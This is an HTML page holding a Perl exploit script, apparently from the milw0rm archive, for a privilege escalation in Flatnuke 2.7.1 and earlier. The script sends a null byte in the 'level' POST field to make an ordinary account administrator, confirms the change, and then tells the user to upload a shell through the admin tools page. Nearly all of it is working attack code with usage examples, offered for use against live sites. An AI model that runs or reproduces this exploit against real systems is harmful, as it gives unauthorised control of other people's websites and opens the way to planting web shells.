<html><head><title>Flatnuke <= 2.7.1 (level) Remote Privilege Escalation Exploit</title></head><pre>#!/usr/bin/env perl
#
# Flatnuke &lt;= 2.7.1 (level) Privilege Escalation 0-day Exploit  
# 
# Description
# -----------
# Flatnuke contains one flaw that may allow a user to become administrator. 
# The issue is due to 'sections/none_Login/section.php' script not properly 
# sanitizing user input supplied to the &quot;level&quot; POST variable. GPC = Off
# Change your rights using the null byte. Dork? Find it yourself.
# -----------
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
# thanks to #zeroidentity chan - http://zeroidentity.org
# Aquilo,mrdotkom,p3ri0d and the other members
#
# http://www.youtube.com/watch?v=fCRkJb8H2mQ italian 
# http://www.youtube.com/watch?v=1U4KKuqdoRg english 
#
# Usage/Example
# -------------  
# perl flatnuke.pl host /path username secid
# perl flatnuke.pl localhost /flatnuke yeat 1ab8c9b8d33a4a4e1001d07af5565d22
# -------------

use LWP::UserAgent;
use IO::Socket;


our ($host,$path,$user,$secid) = @ARGV;

if (@ARGV != 4)  {
      print &quot;Flatnuke &lt;= 2.7.1 (level) Privilege Escalation 0-day Exploit\n&quot;;
      Usage::Exploit();
}
else {
    Flatnuke::Exploit();
}   


sub Flatnuke::Exploit()
{
        my ($ret,$lwp);
        
        $lwp = new LWP::UserAgent;
        
        $lwp-&gt;timeout(5);
        $lwp-&gt;agent('Links (2.1pre26; Linux 2.6.19-gentoo-r5 x86_64; x)');
        $lwp-&gt;default_header('Cookie' =&gt; &quot;myforum=$user; path=$path; secid=$secid; path=$path;&quot;);
        
        $ret = $lwp-&gt;post(&quot;http://$host/$path/index.php?mod=none_Login&quot;,
                          [
                            action     =&gt; 'saveprofile',
                            user       =&gt; $user,
                            hiddenmail =&gt; 'on',
                            ava        =&gt; 'blank.png',
                            level      =&gt; &quot;\x0010&quot;,
                          ]);  
        
        if ($ret-&gt;is_success) {
           Flatnuke::Rights();
        }   
}


sub Flatnuke::Rights()
{
       my $packet;
       my $result;
       my $socket = new IO::Socket::INET(
                                          PeerAddr =&gt; $host,
                                          PeerPort =&gt; 80,
                                          Proto    =&gt; 'tcp',
                                        ) or die $!;
                                          
       $packet .= &quot;GET /$path/index.php?mod=none_Admin HTTP/1.1\r\n&quot;;
       $packet .= &quot;Host: $host\r\n&quot;;
       $packet .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
       $packet .= &quot;Referer: http://$host/$path/index.php?mod=none_Admin\r\n&quot;;
       $packet .= &quot;Cookie: myforum=$user; path=$path; secid=$secid; path=$path;\r\n&quot;;
       $packet .= &quot;Connection: close\r\n\r\n&quot;;
     
       $socket-&gt;send($packet);
     
       while (&lt;$socket&gt;) {
          $result .= $_;
       }
     
       if ($result =~ /(livello|nivel|level|niveau) 10/i) {    
         print &quot;Exploit successful..you're admin\n&quot;;
         print &quot;Upload a shell on: sections/none_Admin/none_tools/webadmin.php\n&quot;;
       }
       else {
         print &quot;Exploit unsuccesful..\n&quot;;
       }    
}


sub Usage::Exploit()
{
        print &quot;Usage: perl $0 host/path username secid\n&quot;;
        print &quot;RunEx: perl localhost /flatnuke yeat c3e557f271a86f893e02971b38b51653\n&quot;;
        print &quot;by staker[at]hotmail[dot]it\n&quot;;
        exit;
}        

# milw0rm.com [2009-04-13]</pre></html>